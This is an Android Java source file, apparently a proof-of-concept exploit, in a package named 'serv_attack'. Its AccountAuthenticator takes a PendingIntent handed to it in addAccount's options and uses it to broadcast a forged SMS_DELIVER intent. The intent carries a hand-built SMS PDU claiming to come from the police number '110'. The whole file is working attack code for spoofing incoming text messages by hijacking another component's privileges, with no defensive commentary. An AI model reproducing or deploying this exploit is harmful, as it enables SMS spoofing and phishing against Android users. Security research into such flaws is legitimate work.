package com.example.serv_attack;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Calendar;
import java.util.GregorianCalendar;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.PendingIntent;
import android.app.PendingIntent.CanceledException;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.PhoneNumberUtils;

public class Authenticator extends AbstractAccountAuthenticator {
	public Authenticator(Context context) {
		super(context);
	}

	@Override
	public Bundle editProperties(AccountAuthenticatorResponse response,
			String accountType) {
		return null;
	}

	private static byte reverseByte(byte b) {
	    return (byte) ((b & 0xF0) >> 4 | (b & 0x0F) << 4);
	}
	
	private static byte[] createFakeSms(Context context,String sender,String body){
		
		
		  //Source: http://stackoverflow.com/a/12338541
	    //Source: http://blog.dev001.net/post/14085892020/android-generate-incoming-sms-from-within-your-app
	        byte[] pdu = null;
	        byte[] scBytes = PhoneNumberUtils
	                .networkPortionToCalledPartyBCD("0000000000");
	        byte[] senderBytes = PhoneNumberUtils
	                .networkPortionToCalledPartyBCD(sender);
	        int lsmcs = scBytes.length;
	        byte[] dateBytes = new byte[7];
	        Calendar calendar = new GregorianCalendar();
	        dateBytes[0] = reverseByte((byte) (calendar.get(Calendar.YEAR)));
	        dateBytes[1] = reverseByte((byte) (calendar.get(Calendar.MONTH) + 1));
	        dateBytes[2] = reverseByte((byte) (calendar.get(Calendar.DAY_OF_MONTH)));
	        dateBytes[3] = reverseByte((byte) (calendar.get(Calendar.HOUR_OF_DAY)));
	        dateBytes[4] = reverseByte((byte) (calendar.get(Calendar.MINUTE)));
	        dateBytes[5] = reverseByte((byte) (calendar.get(Calendar.SECOND)));
	        dateBytes[6] = reverseByte((byte) ((calendar.get(Calendar.ZONE_OFFSET) + calendar
	                .get(Calendar.DST_OFFSET)) / (60 * 1000 * 15)));
	        try {
	            ByteArrayOutputStream bo = new ByteArrayOutputStream();
	            bo.write(lsmcs);
	            bo.write(scBytes);
	            bo.write(0x04);
	            bo.write((byte) sender.length());
	            bo.write(senderBytes);
	            bo.write(0x00);
	            bo.write(0x00); // encoding: 0 for default 7bit
	            bo.write(dateBytes);
	            try {
	                String sReflectedClassName = "com.android.internal.telephony.GsmAlphabet";
	                Class cReflectedNFCExtras = Class.forName(sReflectedClassName);
	                Method stringToGsm7BitPacked = cReflectedNFCExtras.getMethod(
	                        "stringToGsm7BitPacked", new Class[] { String.class });
	                stringToGsm7BitPacked.setAccessible(true);
	                byte[] bodybytes = (byte[]) stringToGsm7BitPacked.invoke(null,
	                        body);
	                bo.write(bodybytes);
	            } catch (Exception e) {
	            }

	            pdu = bo.toByteArray();
	        } catch (IOException e) {
	        }
	        
	        return pdu;
	}
	
	public static Context getGlobalApplicationContext()
	{
	    Class[] type = null;
	    Object[] args = null;
	    Object AT = ReflectionHelper.invokeStaticMethod("android.app.ActivityThread", type, "currentActivityThread", args);
	    if (AT!=null) {
	        Object appObject =  ReflectionHelper.invokeNonStaticMethod(AT, type,"getApplication", args);
	        if (appObject!=null && appObject instanceof Context) {
	            return (Context)appObject;
	        }
	    }
	    return null;
	}
	
	@Override
	public Bundle addAccount(AccountAuthenticatorResponse response,
			String accountType, String authTokenType,
			String[] requiredFeatures, Bundle options)
			throws NetworkErrorException {
		
		byte[] pduu = createFakeSms(getGlobalApplicationContext(),"110","查水表");
        Object[] objArray  = {pduu};
        
        Intent intent = new Intent();
        PendingIntent pending_intent = (PendingIntent)options.get("pendingIntent");
        
        intent.setAction("android.provider.Telephony.SMS_DELIVER");
        intent.putExtra("pdus", objArray);
        intent.putExtra("format", new String("3gpp"));
        
		
        try {
        	pending_intent.send(getGlobalApplicationContext(),0,intent,null,null,null);
		} catch (CanceledException e) {
			e.printStackTrace();
		}
        
        final Bundle bundle = new Bundle();
        bundle.putParcelable(AccountManager.KEY_INTENT, intent);
        return bundle;
       

	}

	@Override
	public Bundle confirmCredentials(AccountAuthenticatorResponse response,
			Account account, Bundle options) throws NetworkErrorException {
		return null;
	}

	@Override
	public Bundle getAuthToken(AccountAuthenticatorResponse response,
			Account account, String authTokenType, Bundle options)
			throws NetworkErrorException {
		return null;
	}

	@Override
	public String getAuthTokenLabel(String authTokenType) {
		return null;
	}

	@Override
	public Bundle updateCredentials(AccountAuthenticatorResponse response,
			Account account, String authTokenType, Bundle options)
			throws NetworkErrorException {
		return null;
	}

	@Override
	public Bundle hasFeatures(AccountAuthenticatorResponse response,
			Account account, String[] features) throws NetworkErrorException {
		return null;
	}
}
